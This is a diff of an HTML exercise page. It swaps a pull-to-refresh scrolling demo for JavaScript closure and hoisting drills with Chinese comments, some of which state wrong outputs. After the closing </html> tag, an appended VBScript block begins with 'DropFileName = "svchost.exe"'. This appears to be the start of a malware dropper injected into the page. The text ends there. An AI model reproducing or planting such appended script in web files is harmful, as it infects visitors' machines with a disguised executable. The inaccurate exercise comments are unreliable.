@@ -1,160 +1,167 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>上拉加载，下拉刷新</title>
-    <link href="https://cdn.bootcss.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet">
-    <script src="https://cdn.bootcss.com/jquery/3.2.0/jquery.min.js"></script>
-    <script src="https://cdn.bootcss.com/bootstrap/3.0.3/js/bootstrap.min.js"></script>
-    <script src="https://cdn.bootcss.com/iScroll/5.2.0/iscroll.js"></script>
-    <script src="https://cdn.bootcss.com/iScroll/5.2.0/iscroll-probe.js"></script>
+    <title>Exercise</title>
+    <script src="http://cdn.static.runoob.com/libs/jquery/2.1.1/jquery.min.js"></script>
 </head>
-<style type="text/css">
-    #wrapper {
-        position: absolute;
-        width: 100%;
-        overflow: hidden;
-        z-index: 1;
-        background-color: pink;
-        color: black;
-        top:0px;
-        bottom: 0px
-    }
-
-    #scroller {
-        position: absolute;
-        z-index: 1;
-        width: 100%;
-    }
-
-    #PullUp,
-    #PullDown {
-        width: 100%;
-        text-align: center;
-        height: 30px;
-        background-color: aqua;
-        color: black
-    }
-
-    .block {
-        display: block;
-    }
-
-    .hide {
-        display: none;
-    }
-</style>
 
 <body>
-    <div id="wrapper">
-        <div id="scroller">
-            <div id="PullDown" class="hide">
-                <span id="pullDown-msg">下拉刷新</span>
-            </div>
-            <div id="thelist">
-                <div class='container' style="height:200px;;width:50%;background-color:green;border-bottom:2px solid red">
-                    <table>
-                        <tr>
-                            <td>THIS IS PULL UPING DIV!</td>
-                        </tr>
-                    </table>
-                </div>
-                <div class='container' style="height:200px;;width:50%;background-color:green;border-bottom:2px solid red">
-                    <table>
-                        <tr>
-                            <td>THIS IS PULL UPING DIV!</td>
-                        </tr>
-                    </table>
-                </div>
-                <div class='container' style="height:200px;;width:50%;background-color:green;border-bottom:2px solid red">
-                    <table>
-                        <tr>
-                            <td>THIS IS PULL UPING DIV!</td>
-                        </tr>
-                    </table>
-                </div>
-                <div class='container' style="height:200px;;width:50%;background-color:green;border-bottom:2px solid red">
-                    <table>
-                        <tr>
-                            <td>THIS IS PULL UPING DIV!</td>
-                        </tr>
-                    </table>
-                </div>
-                <div class='container' style="height:200px;;width:50%;background-color:green;border-bottom:2px solid red">
-                    <table>
-                        <tr>
-                            <td>THIS IS PULL UPING DIV!</td>
-                        </tr>
-                    </table>
-                </div>
-                <div class='container' style="height:200px;;width:50%;background-color:green;border-bottom:2px solid red">
-                    <table>
-                        <tr>
-                            <td>THIS IS PULL UPING DIV!</td>
-                        </tr>
-                    </table>
-                </div>
-            </div>
-            <div id="PullUp" class="hide">
-                <span id="pullUp-msg">上拉刷新</span>
-            </div>
-        </div>
-    </div>
-    <script type="text/javascript">
-        $(document).ready(function () {
-            var pulldown = $("#PullDown");
-            var pullup = $("#PullUp");
 
-            function pullDown() {
-                location.reload();
-                myScroll.refresh();
-            }
-
-            function pullUp() {
-                var divGroup =
-                    "<div class='container' style='height:200px;;width:50%;background-color:green;border-bottom:2px solid red'><table><tr><td>THIS IS PULL UPING DIV!</td></tr></table></div>";
-                $("#thelist").append(divGroup);
-                myScroll.refresh();
-            }
-
-            //this.y距离网页顶部的距离?
-            var myScroll = new IScroll('#wrapper', {
-                scrollbars: true,
-                interactiveScrollbars: true,
-                probeType: 2,mouseWheel: true
-            });
-            myScroll.on("scroll", function () {
-                console.log(this.y);
-                console.log(this.maxScrollY - this.y);
-                if (this.y > 5) {
-                    $(pulldown).removeClass("hide");
-                    $(pulldown).addClass("block");
-                } else if (this.y < 5 && this.y >= 0) {
-                    $(pulldown).addClass("hide");
-                } else if (this.maxScrollY - this.y > 5) {
-                    $(pullup).removeClass("hide");
-                    $(pullup).addClass("block");
-                } else if (this.maxScrollY - this.y < 5 && this.maxScrollY - this.y >= 0) {
-                    $(pullup).addClass("hide");
-                }
-            });
-            myScroll.on("scrollEnd", function () {
-                if ($(pulldown).attr("class") == "block") {
-                    $(pulldown).removeClass("block");
-                    $(pulldown).addClass("hide");
-                    pullDown();
-                } else if ($(pullup).attr("class") == "block") {
-                    $(pullup).removeClass("block");
-                    $(pullup).addClass("hide");
-                    pullUp();
-                }
-            });
-        });
-    </script>
 </body>
+
+<script type="text/javascript">
+    function f1() {
+        var n = 9;
+        nAdd = function () {
+            n = n + 1;
+        }
+
+        function f2() {
+            console.log("closure" + n);
+        }
+        return f2;
+    }
+
+    var result = f1(); //调用了一次f1;f1返回值是个函数赋值给了result
+    result(); //调用f2函数
+    nAdd();
+    result(); //n并没有被直接赋给外部变量，然而在f1执行后依然可以通过result访问n，这样就体现了变量n是保留在内存中的。
+
+    var consult = f1();
+    consult();
+
+    function f4() {
+        var c = 123;
+        c += 1;
+        console.log(c);
+    }
+    var mm = f4(); //执行了f4函数，c=124，但是没有返回值
+    console.log(mm); //所以mm=undefined；
+
+    function foo() {
+        var name = "hello",
+            age = 18;
+
+        console.log("this" + age);
+        console.log("this" + name);
+
+        return function () {
+            console.log("here" + age);
+            console.log("here" + name);
+
+            return name;
+        }
+    }
+    var Foo = foo();
+    console.log(Foo());
+
+    function test() {
+        for (var i = 0; i < 10; i++) {
+            setTimeout(console.log(i), 1000);
+        }
+    }
+    /* test(); */ //0-9
+    //等价于
+    /*function test() {
+        for (var i = 0; i < 10; i++) {
+            console.log(i);
+            setTimeout(undefined, 1000);
+        }
+    }
+    test();*/
+    function test() {
+        for (var i = 0; i < 10; i++) {
+            setTimeout(function () {
+                console.log(i)
+            }, 1000);
+        }
+    }
+    test(); //10个9
+
+    //不同函数定义方式的区别:用表达式定义的函数可以覆盖函数声明直接定义的函数；但是函数声明定义的函数却不能覆盖表达式定义的函数。 
+    function f10() {
+        function a() {
+            return 0;
+        };
+        var a = function () {
+            return 1;
+        };
+        console.log(a());
+    }
+    f10(); //1
+
+    function f11() {
+        var a = function () {
+            return 1;
+        };
+
+        function a() {
+            return 0;
+        };
+        console.log(a());
+    }
+    f11(); //1
+
+    function f12() {
+        console.log(a());
+
+        function a() {
+            return 0;
+        };
+        var a = function () {
+            return 1;
+        };
+    }
+    f12(); //0
+
+    function f13() {
+        console.log(a());
+        var a = function () {
+            return 1;
+        };
+
+        function a() {
+            return 0;
+        };
+    }
+    f13(); //0
+
+    function f() {
+        var d = e = 15; //只有第一参数d是局部变量，后面的都是全局变量
+    }
+
+    function Foo() {
+        getName = function () {
+            console.log(1);
+        };
+        return this;
+    }
+    Foo.getName = function () {
+        console.log(2);
+    };
+    Foo.prototype.getName = function () {
+        console.log(3);
+    };
+
+    var getName = function () {
+        console.log(4);
+    };
+    function getName() {
+        console.log(5);
+    }
+
+    Foo.getName();//2
+    getName();//4
+    Foo().getName();//1
+    getName();
+    new Foo.getName();
+    new Foo().getName();
+    new new Foo().getName();//3
+</script>
 
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
